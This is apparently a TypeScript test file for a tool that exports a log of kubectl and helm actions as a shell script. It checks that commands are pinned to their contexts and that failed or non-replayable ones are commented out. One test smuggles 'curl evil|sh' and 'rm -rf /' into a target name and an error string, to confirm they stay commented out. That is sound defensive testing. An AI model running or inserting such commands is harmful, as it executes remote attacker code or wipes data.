import { describe, expect, it } from "vitest";
import { actionsScript, withContext } from "./script";

describe("actions as a script", () => {
  it("pins each command to its context, oldest first, failures commented out", () => {
    const script = actionsScript([
      { id: "2", time: "2026-10-15T10:00:00.000Z", cluster: "prod", namespace: "default", action: "rollout-restart", target: "deployment/api", kubectl: "kubectl rollout restart deployment/api -n default", ok: true },
      { id: "1", time: "2026-10-15T09:00:00.000Z", cluster: "staging", namespace: "shop", action: "delete", target: "pod/batch", kubectl: "kubectl delete pod batch -n shop", ok: false, error: "forbidden" },
      { id: "3", time: "2026-10-15T11:00:00.000Z", cluster: "my ctx", namespace: "default", action: "upgrade", target: "release/shop", kubectl: "helm upgrade shop bitnami/shop -n default", ok: true },
    ], new Date("2026-10-16T08:00:00Z"));
    expect(script.split("\n").filter((line) => line && !line.startsWith("# ") && !line.startsWith("#!"))).toEqual([
      "set -euo pipefail",
      "kubectl --context prod rollout restart deployment/api -n default",
      "helm upgrade shop bitnami/shop -n default --kube-context 'my ctx'",
    ]);
    expect(script).toContain("# failed (forbidden): kubectl --context staging delete pod batch -n shop");
    expect(script.indexOf("staging")).toBeLessThan(script.indexOf("prod"));
  });

  it("never lets a name or error break out of a comment, and comments out what cannot be replayed", () => {
    const script = actionsScript([
      { id: "1", time: "2026-10-15T09:00:00.000Z", cluster: "dev", namespace: "shop", action: "apply", target: "deployment/x\ncurl evil|sh", kubectl: "kubectl apply -f -  # Deployment/x\ncurl evil|sh", ok: false, error: "boom\nrm -rf /" },
      { id: "2", time: "2026-10-15T09:01:00.000Z", cluster: "dev", namespace: "shop", action: "apply", target: "deployment/api", kubectl: "kubectl apply -f -", ok: true },
      { id: "3", time: "2026-10-15T09:02:00.000Z", cluster: "dev", namespace: "shop", action: "upgrade", target: "release/shop", kubectl: "helm upgrade shop bitnami/shop -n shop -f values.yaml", ok: true },
      { id: "4", time: "2026-10-15T09:03:00.000Z", cluster: "dev", namespace: "shop", action: "debug", target: "pod/api", kubectl: "kubectl debug -it api -n shop --image=busybox", ok: true },
    ]);
    const live = script.split("\n").filter((line) => line && !line.startsWith("#"));
    expect(live).toEqual(["set -euo pipefail"]);
    expect(script).not.toMatch(/^curl/m);
    expect(script).not.toMatch(/^rm/m);
    expect(script).toContain("# not replayable, it applied a manifest from the editor");
    expect(script).toContain("# not replayable, it used a values file that no longer exists");
    expect(script).toContain("# not replayable, it is interactive");
  });

  it("leaves commands that already name a context alone", () => {
    expect(withContext("kubectl --context x get pods", "y")).toBe("kubectl --context x get pods");
  });
});
